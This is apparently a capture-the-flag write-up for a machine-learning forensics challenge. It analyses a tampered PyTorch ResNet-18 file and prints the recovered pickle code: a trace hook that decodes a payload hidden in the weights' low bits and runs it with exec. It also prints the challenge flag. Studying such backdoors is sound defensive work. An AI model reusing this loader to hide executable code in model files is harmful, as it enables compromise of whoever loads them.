---
title: "🧠 Crystal Corruption"
date: 2025-03-25T11:05:16+01:00
author: "Sirius14"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: CyberApocalypse HTB 2025 Machine Learning challenge
summary:  CyberApocalypse HTB 2025 Machine Learning challenge
disableHLJS: false # to disable highlightjs
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: false
ShowPostNavLinks: false
ShowWordCount: false
ShowRssButtonInSectionTermList: false
UseHugoToc: true
pygmentsUseClasses: true
pygmentsCodeFences: true
---

In the Library of Loria, an ancient crystal (resnet18.pth) containing a magical machine learning model was activated. Unknown to the mage who awakened it, the artifact had been tampered with by Malakar’s followers, embedding malicious enchantments. As Eldoria’s forensic mage, analyze the corrupted model file, uncover its hidden payload, and extract the flag to dispel the dark magic.

# First look

The model we have is malicious, so we need to identify the backdoor. The model file is named `resnet18.pth`, so let's use the ResNet-18 architecture to load it:

```py
#!/usr/bin/python3
import torch
import torch.nn as nn
import torchvision.models as models

model = models.resnet18()

model_path = "resnet18.pth"

try:
    model.load_state_dict(torch.load(model_path))
    print("ResNet-18 model loaded successfully.")
except FileNotFoundError:
    print(f"Model file '{model_path}' not found.")
except Exception as e:
    print(f"Error loading model: {e}")
```

After loading the model, we get the following output:

```
Connecting to 127.0.0.1
Delivering payload to 127.0.0.1
Executing payload on 127.0.0.1
You have been pwned!
ResNet-18 model loaded successfully.
```

Clearly, there is a backdoor !

# Dig deeper

After some research on remote code execution (RCE) vulnerabilities in PyTorch, I found this [blog post](https://medium.com/@piyushbhor22/the-dark-side-of-ai-inside-pytorchs-unpatched-vulnerabilities-0d8ce74fc9b5), which explains that a Python object can be hidden inside data.pkl. Since PyTorch model files are essentially ZIP archives, we can extract and inspect data.pkl.

Upon opening data.pkl, we find the following Python code:

```py
import torch

def stego_decode(tensor, n=3):
    import struct
    import hashlib
    import numpy

    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))
    payload = numpy.packbits(numpy.concatenate([numpy.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel("F")])).tobytes()
    (size, checksum) = struct.unpack("i 64s", payload[:68])
    message = payload[68:68+size]

    return message

def call_and_return_tracer(frame, event, arg):
    global return_tracer
    global stego_decode
    def return_tracer(frame, event, arg):
        if torch.is_tensor(arg):
            payload = stego_decode(arg.data.numpy(), n=3)
            if payload is not None:
                sys.settrace(None)
                exec(payload.decode("utf-8"))

    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return return_tracer
```

We have found the function responsible for executing the RCE!

# Retreive original payload

The final step is to retrieve the payload, which appears to be embedded in the model’s weights. We can extract it using the `stego_decode` function:

```py
with torch.no_grad():
    for name, layer in model.named_children():
        print(stego_decode(layer.weight.numpy()))
```

Executing this code reveals the hidden payload:

```
b'import os\r\n\r\ndef exploit():\r\n    connection = f"Connecting to 127.0.0.1"\r\n    payload = f"Delivering payload to 127.0.0.1"\r\n    result = f"Executing payload on 127.0.0.1"\r\n\r\n    print(connection)\r\n    print(payload)\r\n    print(result)\r\n\r\n    print("You have been pwned!")\r\n\r\nhidden_flag = "HTB{n3v3r_tru5t_p1ckl3_m0d3ls}"\r\n\r\nexploit()'
```

And we successfully retrieve the flag!

Flag was __HTB{n3v3r_tru5t_p1ckl3_m0d3ls}__